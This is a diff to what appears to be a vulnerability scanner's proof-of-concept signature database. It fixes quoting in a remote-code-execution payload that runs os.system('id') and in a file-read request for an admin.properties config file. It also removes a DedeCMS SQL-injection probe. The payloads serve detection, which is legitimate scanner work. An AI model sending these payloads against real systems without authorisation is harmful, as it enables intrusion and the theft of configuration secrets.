@@ -955,7 +955,7 @@ def _init_extra_pocs():
                     method="POST",
                     path="/api/v1/run/",
                     headers={"Content-Type": "application/json"},
-                    body='{"name":"test","code":"__import__(\\'os\\').system(\\'id\\')"}',
+                    body='{"name":"test","code":"__import__(\'os\').system(\'id\')"}',
                 ),
             ],
             matchers=[
@@ -2586,7 +2586,7 @@ def _init_extra_pocs():
             requests=[
                 POCRequest(
                     method="GET",
-                    path="/sys/ui/extend/varkind/custom.jsp?var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}",
+                    path='/sys/ui/extend/varkind/custom.jsp?var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}',
                 ),
             ],
             matchers=[
@@ -2917,27 +2917,11 @@ def _init_extra_pocs():
             ],
             references=["https://www.cnvd.org.cn/"],
             fix_suggestion="升级DedeCMS至最新安全版本。",
-            disclosure_date="2022-03-15",
+            disclosure_date="2022-03-20",
         ),
+    ]
 
-        POC(
-            id="cnvd-dedecms-sqli",
-            name="DedeCMS SQL注入漏洞",
-            description="DedeCMS存在多处SQL注入漏洞。",
-            risk_level=RiskLevel.HIGH,
-            cnvd_ids=["CNVD-2022-12347"],
-            cvss_score=7.5,
-            tags=["dedecms", "cms", "sql-injection", "cnvd"],
-            affected_versions=["DedeCMS < 5.7.100"],
-            requests=[
-                POCRequest(
-                    method="GET",
-                    path="/plus/search.php?keyword=1' AND '1'='1",
-                ),
-            ],
-            matchers=[
-                Matcher(type=MatcherType.STATUS, value=200),
-            ],
-            references=["https://www.cnvd.org.cn/"],
-            fix_suggestion="升级DedeCMS至最新安全版本。",
-            disclosure
+    for poc in pocs:
+        register_poc(poc)
+
+    logger.info(f"Extra POC database initialized with {len(pocs)} signatures")
